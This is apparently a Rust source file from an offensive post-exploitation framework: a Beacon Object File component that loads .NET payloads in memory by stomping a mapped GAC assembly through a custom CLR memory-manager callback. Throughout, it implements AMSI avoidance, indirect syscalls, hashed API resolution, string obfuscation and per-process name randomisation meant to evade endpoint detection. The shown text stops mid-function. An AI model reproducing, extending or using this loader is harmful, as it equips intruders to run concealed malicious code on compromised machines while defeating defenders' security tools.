//! CLR module stomping path for inline mode.
//!
//! Replaces the Load_3 (raw bytes → AMSI scan) approach with Load_2 (by GAC
//! name) + IHostMemoryManager::AcquiredVirtualAddressSpace stomp. The CLR
//! maps the victim GAC assembly; the callback overwrites the mapping with the
//! payload PE before the CLR reads .NET metadata.
//!
//! BofState persists across BOF invocations via a named file mapping in RAM.

use crate::error::OrchestratorError as BofError;
use alloc::vec::Vec;
use core::ffi::c_void;
use opsec_com::appdomain::{AppDomain, Assembly};
use opsec_com::bstr::OwnedBstr;
use opsec_com::clr::{ICLRRuntimeHost, ICorRuntimeHost};
use opsec_com::comptr::{ComPtr, Guid, IUnknown, IUnknownVtbl};
use opsec_com::guids::{
    CLSID_CLR_META_HOST, CLSID_CLR_RUNTIME_HOST, CLSID_COR_RUNTIME_HOST,
    IID_APP_DOMAIN, IID_ICLR_META_HOST, IID_ICLR_RUNTIME_HOST,
    IID_ICLR_RUNTIME_INFO, IID_ICOR_RUNTIME_HOST, IID_IHOST_CONTROL,
    IID_IHOST_MEMORY_MANAGER,
};
use opsec_com::host_control::{
    HostControlObject, HostMallocObject, IHostControlVtbl, IHostMallocVtbl,
};
use opsec_com::host_memory_manager::{
    IHostMemoryManagerVtbl, MemoryManagerObject, StompPayload,
};
use opsec_peb::{resolve_export, resolve_module};
use opsec_strcrypt::{hash, obf, obfw};

const S_OK: i32 = 0;
const E_NOINTERFACE: i32 = 0x80004002_u32 as i32;
const E_NOTIMPL: i32 = 0x80004001_u32 as i32;
const E_OUTOFMEMORY: i32 = 0x8007000E_u32 as i32;

const BOF_STATE_MAGIC: u32 = 0x534E_4A55; // "SNJU" — layout bump for nt_vp_{ssn,gadget}
const HOST_OBJECTS_ANCHOR: u32 = 0xDEAD_BEEF;

#[repr(C)]
struct HostObjects {
    hc_vtbl: IHostControlVtbl,
    mm_vtbl: IHostMemoryManagerVtbl,
    hm_vtbl: IHostMallocVtbl,
    anchor: u32,
}

#[repr(C)]
struct BofState {
    magic: u32,
    host_objects: *mut HostObjects,
    p_cor_host: *mut ICorRuntimeHost,
    memory_manager: *mut MemoryManagerObject,
    stomp_payload: *mut StompPayload,
    p_custom_host: *mut ICLRRuntimeHost,
    p_host_control: *mut HostControlObject,
}

#[inline(always)]
unsafe fn peb_fn<T>(mod_hash: u32, exp_hash: u32) -> Option<T> {
    unsafe {
        let m = resolve_module(mod_hash)?;
        let f = resolve_export(m, exp_hash)?;
        Some(core::mem::transmute_copy(&f))
    }
}

/// Indirect-syscall `NtProtectVirtualMemory` with userland-VirtualProtect
/// fallback. Returns true on success (NTSTATUS == 0 or VirtualProtect != 0).
///
/// Reads the cached SSN + gadget from `StompPayload` so it works from the
/// `mm_acquired_vas` CLR callback without a thread-local Bootstrap instance.
/// When SSN or gadget is zero (Bootstrap::init failed or wasn't run yet),
/// falls back to PEB-resolved kernel32!VirtualProtect — same behaviour as
/// pre-hardening builds.
///
/// `NtProtectVirtualMemory` requires the in/out base + size pointers to be
/// writable; we synthesise stack-local copies and discard the post-call values
/// (mm_acquired_vas does not care about page-aligned-base normalisation).
unsafe fn vp_indirect(
    sp: *const StompPayload,
    addr: *mut c_void,
    size: usize,
    new_prot: u32,
    old_prot: *mut u32,
) -> bool {
    unsafe {
        let ssn = (*sp).nt_vp_ssn;
        let gadget = (*sp).nt_vp_gadget;
        if ssn != 0 && gadget != 0 {
            let process_handle = (-1isize) as *mut c_void; // NtCurrentProcess pseudo-handle
            let mut base_io = addr;
            let mut size_io = size;
            // Inline a minimal Bootstrap-equivalent dispatch: SSN + gadget are
            // already cached, so we just call indirect_syscall6 with the 6th
            // arg zeroed (NtProtectVirtualMemory's stub does not read it).
            let nt_status = opsec_bootstrap::indirect_syscall6(
                process_handle as usize,
                core::ptr::addr_of_mut!(base_io) as usize,
                core::ptr::addr_of_mut!(size_io) as usize,
                new_prot as usize,
                old_prot as usize,
                0,
                ssn,
                gadget,
            );
            nt_status == 0
        } else {
            type VPFn = unsafe extern "system" fn(*mut c_void, usize, u32, *mut u32) -> i32;
            match peb_fn::<VPFn>(hash!("kernel32.dll"), hash!("VirtualProtect")) {
                Some(f) => f(addr, size, new_prot, old_prot) != 0,
                None => false,
            }
        }
    }
}

unsafe fn refresh_vtables(objs: *mut HostObjects) {
    unsafe {
        (*objs).hc_vtbl = IHostControlVtbl {
            base: IUnknownVtbl {
                query_interface: hc_qi,
                add_ref: hc_addref,
                release: hc_release,
            },
            get_host_manager: hc_get_host_manager,
            set_app_domain_manager: hc_set_app_domain_manager,
        };
        (*objs).mm_vtbl = IHostMemoryManagerVtbl {
            base: IUnknownVtbl {
                query_interface: mm_qi,
                add_ref: mm_addref,
                release: mm_release,
            },
            create_malloc: mm_create_malloc,
            virtual_alloc: mm_virtual_alloc,
            virtual_free: mm_virtual_free,
            virtual_query: mm_virtual_query,
            virtual_protect_host: mm_virtual_protect_host,
            get_memory_load: mm_get_memory_load,
            register_memory_notification_cb: mm_register_cb,
            needs_virtual_address_space: mm_needs_vas,
            acquired_virtual_address_space: mm_acquired_vas,
            released_virtual_address_space: mm_released_vas,
        };
        (*objs).hm_vtbl = IHostMallocVtbl {
            base: IUnknownVtbl {
                query_interface: hm_qi,
                add_ref: hm_addref,
                release: hm_release,
            },
            alloc: hm_alloc,
            debug_alloc: hm_debug_alloc,
            free: hm_free,
        };
        (*objs).anchor = HOST_OBJECTS_ANCHOR;
    }
}

// ─── IHostControl callbacks ─────────────────────────────────────────────────

unsafe extern "system" fn hc_qi(this: *mut c_void, riid: *const Guid, ppv: *mut *mut c_void) -> i32 {
    unsafe {
        let iid_unk = Guid {
            data1: 0, data2: 0, data3: 0,
            data4: [0xC0, 0, 0, 0, 0, 0, 0, 0x46],
        };
        if guid_eq(&*riid, &iid_unk) || guid_eq(&*riid, &IID_IHOST_CONTROL) {
            *ppv = this;
            hc_addref(this);
            return S_OK;
        }
        *ppv = core::ptr::null_mut();
        E_NOINTERFACE
    }
}

unsafe extern "system" fn hc_addref(this: *mut c_void) -> u32 {
    unsafe {
        let obj = this as *mut HostControlObject;
        let old = core::ptr::read_volatile(&(*obj).ref_count);
        core::ptr::write_volatile(&mut (*obj).ref_count, old + 1);
        (old + 1) as u32
    }
}

unsafe extern "system" fn hc_release(this: *mut c_void) -> u32 {
    unsafe {
        let obj = this as *mut HostControlObject;
        let old = core::ptr::read_volatile(&(*obj).ref_count);
        let new_count = old - 1;
        core::ptr::write_volatile(&mut (*obj).ref_count, new_count);
        new_count as u32
    }
}

unsafe extern "system" fn hc_get_host_manager(
    this: *mut c_void, riid: *const Guid, ppv: *mut *mut c_void,
) -> i32 {
    unsafe {
        let obj = this as *mut HostControlObject;
        if guid_eq(&*riid, &IID_IHOST_MEMORY_MANAGER) {
            crate::dlog2(b"[mm] GetHostManager: returning MM");
            let mm = (*obj).memory_manager;
            mm_addref(mm as *mut c_void);
            *ppv = mm as *mut c_void;
            return S_OK;
        }
        crate::dlog2(b"[mm] GetHostManager: E_NOINTERFACE");
        *ppv = core::ptr::null_mut();
        E_NOINTERFACE
    }
}

unsafe extern "system" fn hc_set_app_domain_manager(
    _this: *mut c_void, _id: u32, _mgr: *mut c_void,
) -> i32 {
    E_NOTIMPL
}

// ─── IHostMemoryManager callbacks ───────────────────────────────────────────

unsafe extern "system" fn mm_qi(this: *mut c_void, riid: *const Guid, ppv: *mut *mut c_void) -> i32 {
    unsafe {
        let iid_unk = Guid {
            data1: 0, data2: 0, data3: 0,
            data4: [0xC0, 0, 0, 0, 0, 0, 0, 0x46],
        };
        if guid_eq(&*riid, &iid_unk) || guid_eq(&*riid, &IID_IHOST_MEMORY_MANAGER) {
            *ppv = this;
            mm_addref(this);
            return S_OK;
        }
        *ppv = core::ptr::null_mut();
        E_NOINTERFACE
    }
}

unsafe extern "system" fn mm_addref(this: *mut c_void) -> u32 {
    unsafe {
        let obj = this as *mut MemoryManagerObject;
        let old = core::ptr::read_volatile(&(*obj).ref_count);
        core::ptr::write_volatile(&mut (*obj).ref_count, old + 1);
        (old + 1) as u32
    }
}

unsafe extern "system" fn mm_release(this: *mut c_void) -> u32 {
    unsafe {
        let obj = this as *mut MemoryManagerObject;
        let old = core::ptr::read_volatile(&(*obj).ref_count);
        let new_count = old - 1;
        core::ptr::write_volatile(&mut (*obj).ref_count, new_count);
        new_count as u32
    }
}

unsafe extern "system" fn mm_create_malloc(
    this: *mut c_void, dw_malloc_type: u32, pp_malloc: *mut *mut c_void,
) -> i32 {
    unsafe {
        crate::dlog2(b"[mm] CreateMalloc called");
        let _ = dw_malloc_type;

        type GlobalAllocFn = unsafe extern "system" fn(u32, usize) -> *mut c_void;
        type GetProcessHeapFn = unsafe extern "system" fn() -> *mut c_void;

        let global_alloc_fn: GlobalAllocFn = match peb_fn(hash!("kernel32.dll"), hash!("GlobalAlloc")) {
            Some(f) => f,
            None => return E_OUTOFMEMORY,
        };

        let hm_raw = global_alloc_fn(0x0040, core::mem::size_of::<HostMallocObject>());
        if hm_raw.is_null() {
            return E_OUTOFMEMORY;
        }
        let hm_obj = hm_raw as *mut HostMallocObject;

        // Use the process heap rather than a newly created heap. HeapCreate(0,0,0)
        // can raise SEH exceptions inside CLR's EEStartup (global heap validation
        // flags or EDR hooks on custom heaps). The process heap is always valid and
        // pre-warmed for the lifetime of the process.
        let heap = match peb_fn::<GetProcessHeapFn>(hash!("kernel32.dll"), hash!("GetProcessHeap")) {
            Some(f) => f(),
            None => core::ptr::null_mut(),
        };
        if heap.is_null() {
            crate::dlog2(b"[mm] CreateMalloc: GetProcessHeap failed");
            type GlobalFreeFn = unsafe extern "system" fn(*mut c_void) -> *mut c_void;
            if let Some(gf) = peb_fn::<GlobalFreeFn>(hash!("kernel32.dll"), hash!("GlobalFree")) {
                gf(hm_raw);
            }
            return E_OUTOFMEMORY;
        }

        let mm = this as *mut MemoryManagerObject;
        let mm_vtbl_ptr = (*mm).vtbl;
        let hc_vtbl_size = core::mem::size_of::<IHostControlVtbl>();
        let host_objs_ptr = (mm_vtbl_ptr as *const u8).sub(hc_vtbl_size) as *mut HostObjects;
        (*hm_obj).vtbl = core::ptr::addr_of!((*host_objs_ptr).hm_vtbl);
        (*hm_obj).ref_count = 1;
        (*hm_obj).heap_handle = heap;

        (*mm).malloc_obj = hm_obj;
        *pp_malloc = hm_obj as *mut c_void;
        crate::dlog2(b"[mm] CreateMalloc ok");
        S_OK
    }
}

unsafe extern "system" fn mm_virtual_alloc(
    _this: *mut c_void, p_addr: *mut c_void, dw_size: usize,
    fl_alloc: u32, fl_protect: u32, _crit_level: u32, pp_mem: *mut *mut c_void,
) -> i32 {
    unsafe {
        crate::dlog2(b"[mm] VirtualAlloc called");
        type VirtualAllocFn = unsafe extern "system" fn(*mut c_void, usize, u32, u32) -> *mut c_void;
        match peb_fn::<VirtualAllocFn>(hash!("kernel32.dll"), hash!("VirtualAlloc")) {
            Some(f) => {
                let p = f(p_addr, dw_size, fl_alloc, fl_protect);
                *pp_mem = p;
                if p.is_null() {
                    crate::dlog2(b"[mm] VirtualAlloc: returned null");
                    E_OUTOFMEMORY
                } else {
                    crate::dlog2(b"[mm] VirtualAlloc ok");
                    S_OK
                }
            }
            None => {
                crate::dlog2(b"[mm] VirtualAlloc: peb_fn failed");
                E_OUTOFMEMORY
            }
        }
    }
}

unsafe extern "system" fn mm_virtual_free(
    _this: *mut c_void, lp_addr: *mut c_void, dw_size: usize, dw_free_type: u32,
) -> i32 {
    unsafe {
        type VirtualFreeFn = unsafe extern "system" fn(*mut c_void, usize, u32) -> i32;
        match peb_fn::<VirtualFreeFn>(hash!("kernel32.dll"), hash!("VirtualFree")) {
            Some(f) => if f(lp_addr, dw_size, dw_free_type) != 0 { S_OK } else { -1 },
            None => -1,
        }
    }
}

unsafe extern "system" fn mm_virtual_query(
    _this: *mut c_void, lp_addr: *mut c_void, lp_buf: *mut c_void,
    dw_len: usize, p_result: *mut usize,
) -> i32 {
    unsafe {
        type VirtualQueryFn = unsafe extern "system" fn(*const c_void, *mut c_void, usize) -> usize;
        match peb_fn::<VirtualQueryFn>(hash!("kernel32.dll"), hash!("VirtualQuery")) {
            Some(f) => {
                *p_result = f(lp_addr as *const c_void, lp_buf, dw_len);
                S_OK
            }
            None => -1,
        }
    }
}

unsafe extern "system" fn mm_virtual_protect_host(
    _this: *mut c_void, lp_addr: *mut c_void, dw_size: usize, fl_new: u32, pfl_old: *mut u32,
) -> i32 {
    unsafe {
        type VirtualProtectFn = unsafe extern "system" fn(*mut c_void, usize, u32, *mut u32) -> i32;
        match peb_fn::<VirtualProtectFn>(hash!("kernel32.dll"), hash!("VirtualProtect")) {
            Some(f) => if f(lp_addr, dw_size, fl_new, pfl_old) != 0 { S_OK } else { -1 },
            None => -1,
        }
    }
}

unsafe extern "system" fn mm_get_memory_load(
    _this: *mut c_void, p_load: *mut u32, p_avail: *mut usize,
) -> i32 {
    unsafe {
        *p_load = 30;
        *p_avail = 100 * 1024 * 1024;
        S_OK
    }
}

unsafe extern "system" fn mm_register_cb(_this: *mut c_void, _cb: *mut c_void) -> i32 {
    crate::dlog2(b"[mm] RegisterMemNotifCb called");
    S_OK
}
unsafe extern "system" fn mm_needs_vas(_this: *mut c_void, _base: *mut c_void, _sz: usize) -> i32 { S_OK }
unsafe extern "system" fn mm_released_vas(_this: *mut c_void, _base: *mut c_void) -> i32 { S_OK }

fn section_prot(characteristics: u32) -> u32 {
    const MEM_EXECUTE: u32 = 0x2000_0000;
    const MEM_READ: u32 = 0x4000_0000;
    const MEM_WRITE: u32 = 0x8000_0000;
    let exec = characteristics & MEM_EXECUTE != 0;
    let read = characteristics & MEM_READ != 0;
    let write = characteristics & MEM_WRITE != 0;
    match (exec, read, write) {
        (true, true, true) => 0x40,
        (true, true, false) => 0x20,
        (true, false, false) => 0x10,
        (false, true, true) => 0x04,
        (false, true, false) => 0x02,
        _ => 0x02,
    }
}

unsafe extern "system" fn mm_acquired_vas(
    this: *mut c_void, start_addr: *mut c_void, size: usize,
) -> i32 {
    unsafe {
        crate::dlog2(b"[mm] AcquiredVAS called");
        let mm = this as *mut MemoryManagerObject;
        let sp = (*mm).stomp_payload;
        if sp.is_null() {
            return S_OK;
        }
        if core::ptr::read_volatile(&(*sp).pending) == 0 {
            return S_OK;
        }

        let payload_bytes = (*sp).payload_bytes;
        let payload_size = (*sp).payload_size;
        let image_size = (*sp).image_size;

        if payload_bytes.is_null() || payload_size < 0x40 {
            return S_OK;
        }
        if size < image_size {
            crate::dlog2(b"[stomp] victim too small");
            return S_OK;
        }

        // Tight size-band guard: only accept mappings within ±64 KB of the
        // selected victim's on-disk SizeOfImage. Dependency DLLs loaded during
        // Load_2 can fall anywhere between payload_image_size and the victim
        // size; the upper bound alone is not sufficient when payload is large
        // (e.g. mscorlib at ~5 MB fits between a 200 KB payload and a 6 MB
        // System.ServiceModel victim and would get wrong-stomped → Beacon
        // crash). The combined upper and lower bound narrows the window to a
        // single victim-sized DLL.
        // victim_image_size == usize::MAX means GAC read failed — skip both
        // bounds and fall back to the original "size >= payload" behaviour.
        let victim_image_size = (*sp).victim_image_size;
        if victim_image_size != usize::MAX {
            if size > victim_image_size.saturating_add(0x10000) {
                crate::dlog2(b"[stomp] mapping too large (dependency?), skipping");
                return S_OK;
            }
            if size < victim_image_size.saturating_sub(0x10000) {
                crate::dlog2(b"[stomp] mapping too small for victim, skipping");
                return S_OK;
            }
        }

        let start_u8 = start_addr as *const u8;
        let mz = u16::from_le_bytes([*start_u8, *start_u8.add(1)]);
        if mz != 0x5A4D {
            return S_OK;
        }

        if payload_size < 0x40 {
            return S_OK;
        }
        let e_lfanew = u32::from_le_bytes([
            *payload_bytes.add(0x3C),
            *payload_bytes.add(0x3D),
            *payload_bytes.add(0x3E),
            *payload_bytes.add(0x3F),
        ]) as usize;
        if e_lfanew.saturating_add(88) > payload_size {
            return S_OK;
        }
        let opt = e_lfanew + 24;
        let size_of_headers = u32::from_le_bytes([
            *payload_bytes.add(opt + 60),
            *payload_bytes.add(opt + 61),
            *payload_bytes.add(opt + 62),
            *payload_bytes.add(opt + 63),
        ]) as usize;
        let opt_hdr_size = u16::from_le_bytes([
            *payload_bytes.add(e_lfanew + 20),
            *payload_bytes.add(e_lfanew + 21),
        ]) as usize;
        let n_sections = u16::from_le_bytes([
            *payload_bytes.add(e_lfanew + 6),
            *payload_bytes.add(e_lfanew + 7),
        ]) as usize;
        let section_table_off = e_lfanew + 24 + opt_hdr_size;

        if size_of_headers > payload_size {
            return S_OK;
        }
        if section_table_off + n_sections * 40 > payload_size {
            return S_OK;
        }

        // Single-stomp guard: clear pending AFTER all structural precondition
        // checks on both victim mapping and payload pass. Prevents a second
        // AcquiredVAS call (dependency DLL mapped after victim during Load_2)
        // from consuming the stomp opportunity, and ensures payload-structure
        // failures do not silently discard the one chance to stomp.
        core::ptr::write_volatile(&mut (*sp).pending, 0);

        let mut old_prot: u32 = 0;

        if !vp_indirect(sp, start_addr, size_of_headers, 0x04, &mut old_prot) {
            return S_OK;
        }
        core::ptr::write_bytes(start_addr as *mut u8, 0, size_of_headers);
        core::ptr::copy_nonoverlapping(payload_bytes, start_addr as *mut u8, size_of_headers);
        let _ = vp_indirect(sp, start_addr, size_of_headers, 0x02, &mut old_prot);

        let mut ok = true;
        for i in 0..n_sections {
            let sh = section_table_off + i * 40;
            let va = u32::from_le_bytes([
                *payload_bytes.add(sh + 12),
                *payload_bytes.add(sh + 13),
                *payload_bytes.add(sh + 14),
                *payload_bytes.add(sh + 15),
            ]) as usize;
            let vsz = u32::from_le_bytes([
                *payload_bytes.add(sh + 8),
                *payload_bytes.add(sh + 9),
                *payload_bytes.add(sh + 10),
                *payload_bytes.add(sh + 11),
            ]) as usize;
            let raw_off = u32::from_le_bytes([
                *payload_bytes.add(sh + 20),
                *payload_bytes.add(sh + 21),
                *payload_bytes.add(sh + 22),
                *payload_bytes.add(sh + 23),
            ]) as usize;
            let raw_sz = u32::from_le_bytes([
                *payload_bytes.add(sh + 16),
                *payload_bytes.add(sh + 17),
                *payload_bytes.add(sh + 18),
                *payload_bytes.add(sh + 19),
            ]) as usize;
            let chars = u32::from_le_bytes([
                *payload_bytes.add(sh + 36),
                *payload_bytes.add(sh + 37),
                *payload_bytes.add(sh + 38),
                *payload_bytes.add(sh + 39),
            ]);

            if va + vsz > size {
                ok = false;
                break;
            }
            if raw_sz > 0 && raw_off + raw_sz > payload_size {
                ok = false;
                break;
            }

            let dest = (start_addr as *mut u8).add(va);
            if !vp_indirect(sp, dest as *mut c_void, vsz, 0x04, &mut old_prot) {
                ok = false;
                break;
            }
            core::ptr::write_bytes(dest, 0, vsz);
            if raw_sz > 0 {
                let copy_sz = raw_sz.min(vsz);
                core::ptr::copy_nonoverlapping(payload_bytes.add(raw_off), dest, copy_sz);
            }
            let restored_prot = section_prot(chars);
            let _ = vp_indirect(sp, dest as *mut c_void, vsz, restored_prot, &mut old_prot);
        }

        if ok {
            core::ptr::write_volatile(&mut (*sp).stomped, 1);
            crate::dlog2(b"[stomp] PE-mapped payload into victim");
        }
        S_OK
    }
}

// ─── IHostMalloc callbacks ───────────────────────────────────────────────────

unsafe extern "system" fn hm_qi(this: *mut c_void, riid: *const Guid, ppv: *mut *mut c_void) -> i32 {
    unsafe {
        let iid_unk = Guid {
            data1: 0, data2: 0, data3: 0,
            data4: [0xC0, 0, 0, 0, 0, 0, 0, 0x46],
        };
        let iid_hm = Guid {
            data1: 0x1831991C, data2: 0xCC53, data3: 0x4A31,
            data4: [0xB2, 0x18, 0x04, 0xE9, 0x10, 0x44, 0x64, 0x79],
        };
        if guid_eq(&*riid, &iid_unk) || guid_eq(&*riid, &iid_hm) {
            *ppv = this;
            hm_addref(this);
            return S_OK;
        }
        *ppv = core::ptr::null_mut();
        E_NOINTERFACE
    }
}

unsafe extern "system" fn hm_addref(this: *mut c_void) -> u32 {
    unsafe {
        let obj = this as *mut HostMallocObject;
        let old = core::ptr::read_volatile(&(*obj).ref_count);
        core::ptr::write_volatile(&mut (*obj).ref_count, old + 1);
        (old + 1) as u32
    }
}

unsafe extern "system" fn hm_release(this: *mut c_void) -> u32 {
    unsafe {
        let obj = this as *mut HostMallocObject;
        let old = core::ptr::read_volatile(&(*obj).ref_count);
        let n = old - 1;
        core::ptr::write_volatile(&mut (*obj).ref_count, n);
        n as u32
    }
}

unsafe extern "system" fn hm_alloc(
    this: *mut c_void, cb: usize, _crit: u32, pp_mem: *mut *mut c_void,
) -> i32 {
    unsafe {
        crate::dlog2(b"[mm] Alloc called");
        crate::dlog2_hex(b"[mm] Alloc: cb=", cb as u32);
        let obj = this as *mut HostMallocObject;
        type HeapAllocFn = unsafe extern "system" fn(*mut c_void, u32, usize) -> *mut c_void;
        match peb_fn::<HeapAllocFn>(hash!("kernel32.dll"), hash!("HeapAlloc")) {
            Some(f) => {
                crate::dlog2(b"[mm] Alloc: calling HeapAlloc");
                let sz = if cb == 0 { 1 } else { cb };
                let p = f((*obj).heap_handle, 0, sz);
                crate::dlog2(b"[mm] Alloc: HeapAlloc returned");
                *pp_mem = p;
                if p.is_null() {
                    crate::dlog2(b"[mm] Alloc FAILED (null)");
                    E_OUTOFMEMORY
                } else {
                    crate::dlog2(b"[mm] Alloc ok");
                    S_OK
                }
            }
            None => {
                crate::dlog2(b"[mm] Alloc FAILED (no HeapAlloc)");
                E_OUTOFMEMORY
            }
        }
    }
}

unsafe extern "system" fn hm_debug_alloc(
    this: *mut c_void, cb: usize, crit: u32, _file: *const u8, _line: i32,
    pp_mem: *mut *mut c_void,
) -> i32 {
    unsafe { hm_alloc(this, cb, crit, pp_mem) }
}

unsafe extern "system" fn hm_free(this: *mut c_void, p_mem: *mut c_void) -> i32 {
    unsafe {
        if p_mem.is_null() {
            return S_OK;
        }
        let obj = this as *mut HostMallocObject;
        type HeapFreeFn = unsafe extern "system" fn(*mut c_void, u32, *mut c_void) -> i32;
        if let Some(f) = peb_fn::<HeapFreeFn>(hash!("kernel32.dll"), hash!("HeapFree")) {
            f((*obj).heap_handle, 0, p_mem);
        }
        S_OK
    }
}

// ─── Helpers ─────────────────────────────────────────────────────────────────

fn guid_eq(a: &Guid, b: &Guid) -> bool {
    a.data1 == b.data1 && a.data2 == b.data2 && a.data3 == b.data3 && a.data4 == b.data4
}

unsafe fn global_alloc_zeroed(size: usize) -> *mut c_void {
    unsafe {
        type GlobalAllocFn = unsafe extern "system" fn(u32, usize) -> *mut c_void;
        match peb_fn::<GlobalAllocFn>(hash!("kernel32.dll"), hash!("GlobalAlloc")) {
            Some(f) => f(0x0040, size),
            None => core::ptr::null_mut(),
        }
    }
}

/// Read the low 32 bits of `PEB->ImageBaseAddress` on x86_64 via `gs:[0x60]`.
/// Returns 0 if PEB is unreadable. Used to mix Beacon-spawn-unique entropy
/// into derived names (e.g. the BofState file mapping) so a static fingerprint
/// regex over Local\<8hex> can't pre-match the operator's tooling.
#[inline(always)]
unsafe fn read_peb_image_base_lo() -> u32 {
    unsafe {
        let peb: *const u8;
        core::arch::asm!(
            "mov {}, gs:[0x60]",
            out(reg) peb,
            options(nostack, preserves_flags),
        );
        if peb.is_null() {
            return 0;
        }
        let image_base_ptr = peb.add(0x10) as *const usize;
        let ib = core::ptr::read(image_base_ptr);
        ib as u32
    }
}

unsafe fn bof_state_name() -> Vec<u8> {
    unsafe {
        type GetPidFn = unsafe extern "system" fn() -> u32;
        let pid: u32 = match peb_fn::<GetPidFn>(hash!("kernel32.dll"), hash!("GetCurrentProcessId")) {
            Some(f) => f(),
            None => 0xDEAD_BEEF,
        };
        let pid_bytes = pid.to_le_bytes();
        let mut h: u32 = 5381;
        for &b in &pid_bytes {
            h = h.wrapping_mul(33).wrapping_add(b as u32);
        }
        // Mix Beacon-spawn-unique entropy (PEB ImageBase, ASLR-randomised) so
        // the derived 8-hex string differs per Beacon process. Fallback to 0
        // (perilaku lama) if PEB read fails.
        let image_base_lo = read_peb_image_base_lo();
        const MAGIC: u32 = 0xA1B2_C3D4;
        let name_val = h ^ image_base_lo ^ MAGIC;
        let prefix = obf!("Local\\");
        let prefix_bytes = prefix.as_bytes();
        let mut name = Vec::with_capacity(16);
        name.extend_from_slice(prefix_bytes);
        let hex = b"0123456789abcdef";
        for shift in (0..32).step_by(4).rev() {
            name.push(hex[((name_val >> shift) & 0xF) as usize]);
        }
        name.push(0u8);
        name
    }
}

unsafe fn try_open_bof_state(name: &[u8]) -> Option<(*mut c_void, *mut BofState)> {
    unsafe {
        type OpenFileMappingAFn = unsafe extern "system" fn(u32, i32, *const u8) -> *mut c_void;
        type MapViewOfFileFn =
            unsafe extern "system" fn(*mut c_void, u32, u32, u32, usize) -> *mut c_void;

        let open_fm: OpenFileMappingAFn =
            peb_fn(hash!("kernel32.dll"), hash!("OpenFileMappingA"))?;
        let map_view: MapViewOfFileFn = peb_fn(hash!("kernel32.dll"), hash!("MapViewOfFile"))?;

        let h = open_fm(0x0002 | 0x0004, 0, name.as_ptr());
        if h.is_null() {
            return None;
        }

        let view = map_view(h, 0x0002 | 0x0004, 0, 0, core::mem::size_of::<BofState>());
        if view.is_null() {
            type CloseHandleFn = unsafe extern "system" fn(*mut c_void) -> i32;
            if let Some(ch) = peb_fn::<CloseHandleFn>(hash!("kernel32.dll"), hash!("CloseHandle")) {
                ch(h);
            }
            return None;
        }
        Some((h, view as *mut BofState))
    }
}

unsafe fn create_bof_state(name: &[u8], state: &BofState) -> Result<(), BofError> {
    unsafe {
        type CreateFileMappingAFn = unsafe extern "system" fn(
            *mut c_void,
            *mut c_void,
            u32,
            u32,
            u32,
            *const u8,
        ) -> *mut c_void;
        type MapViewOfFileFn =
            unsafe extern "system" fn(*mut c_void, u32, u32, u32, usize) -> *mut c_void;
        type UnmapViewOfFileFn = unsafe extern "system" fn(*const c_void) -> i32;

        let create_fm: CreateFileMappingAFn =
            peb_fn(hash!("kernel32.dll"), hash!("CreateFileMappingA"))
                .ok_or(BofError::Clr { hr: -1, op: "cfm0" })?;
        let map_view: MapViewOfFileFn = peb_fn(hash!("kernel32.dll"), hash!("MapViewOfFile"))
            .ok_or(BofError::Clr { hr: -1, op: "cfm1" })?;
        let unmap_view: UnmapViewOfFileFn =
            peb_fn(hash!("kernel32.dll"), hash!("UnmapViewOfFile"))
                .ok_or(BofError::Clr { hr: -1, op: "cfm2" })?;

        let invalid_handle = usize::MAX as *mut c_void;
        let h = create_fm(
            invalid_handle,
            core::ptr::null_mut(),
            0x04,
            0,
            core::mem::size_of::<BofState>() as u32,
            name.as_ptr(),
        );
        if h.is_null() {
            return Err(BofError::Clr { hr: -1, op: "cfm3" });
        }

        let view = map_view(h, 0x0002 | 0x0004, 0, 0, core::mem::size_of::<BofState>());
        if view.is_null() {
            return Err(BofError::Clr { hr: -1, op: "cfm4" });
        }

        let dst = view as *mut BofState;
        core::ptr::write(dst, core::ptr::read(state));
        unmap_view(view as *const c_void);
        // h intentionally NOT closed - keeps mapping alive across BOF invocations.
        let _ = h;
        Ok(())
    }
}

// ─── Victim selection ────────────────────────────────────────────────────────

struct VictimCandidate {
    identity_wide: Vec<u16>,
    dll_name_a: Vec<u8>,
    version_dir: Vec<u8>,
}

/// Reads SizeOfImage from a victim DLL's GAC_MSIL disk path.
/// Path: %SystemRoot%\Microsoft.NET\assembly\GAC_MSIL\<base>\<ver_dir>\<dll_name>
/// All APIs via PEB walk — no import entries.
/// Returns None on any failure; caller uses usize::MAX as fallback.
unsafe fn read_victim_size_from_gac(candidate: &VictimCandidate) -> Option<usize> {
    unsafe {
        type GetEnvAFn = unsafe extern "system" fn(*const u8, *mut u8, u32) -> u32;
        type CreateFileAFn = unsafe extern "system" fn(
            *const u8, u32, u32, *mut c_void, u32, u32, *mut c_void,
        ) -> *mut c_void;
        type ReadFileFn = unsafe extern "system" fn(
            *mut c_void, *mut c_void, u32, *mut u32, *mut c_void,
        ) -> i32;
        type CloseHandleFn = unsafe extern "system" fn(*mut c_void) -> i32;

        let get_env = peb_fn::<GetEnvAFn>(hash!("kernel32.dll"), hash!("GetEnvironmentVariableA"))?;
        let create_file = peb_fn::<CreateFileAFn>(hash!("kernel32.dll"), hash!("CreateFileA"))?;
        let read_file = peb_fn::<ReadFileFn>(hash!("kernel32.dll"), hash!("ReadFile"))?;
        let close_handle = peb_fn::<CloseHandleFn>(hash!("kernel32.dll"), hash!("CloseHandle"))?;

        // 1. Get %SystemRoot% (e.g. "C:\Windows")
        let sysroot_key = obf!("SystemRoot\0");
        let mut sysroot_buf = [0u8; 260];
        let n = get_env(sysroot_key.as_bytes().as_ptr(), sysroot_buf.as_mut_ptr(), 260);
        if n == 0 || n >= 260 {
            return None;
        }
        let sysroot_len = n as usize;

        // 2. DLL name without null terminator and without ".dll" extension
        let dll_name: &[u8] = {
            let raw = &candidate.dll_name_a;
            let end = raw.iter().position(|&b| b == 0).unwrap_or(raw.len());
            &raw[..end]
        };
        let dll_base: &[u8] = if dll_name.ends_with(b".dll") || dll_name.ends_with(b".DLL") {
            &dll_name[..dll_name.len() - 4]
        } else {
            dll_name
        };

        // 3. Version dir without null terminator
        let ver_dir: &[u8] = {
            let raw = &candidate.version_dir;
            let end = raw.iter().position(|&b| b == 0).unwrap_or(raw.len());
            &raw[..end]
        };

        // 4. Build path: sysroot + \Microsoft.NET\assembly\GAC_MSIL\ + base + \ + ver + \ + dll
        let prefix = obf!("\\Microsoft.NET\\assembly\\GAC_MSIL\\");
        let total_len = sysroot_len
            + prefix.as_bytes().len()
            + dll_base.len() + 1
            + ver_dir.len() + 1
            + dll_name.len() + 1;

        if total_len > 520 {
            return None;
        }

        let mut path: Vec<u8> = Vec::with_capacity(total_len);
        path.extend_from_slice(&sysroot_buf[..sysroot_len]);
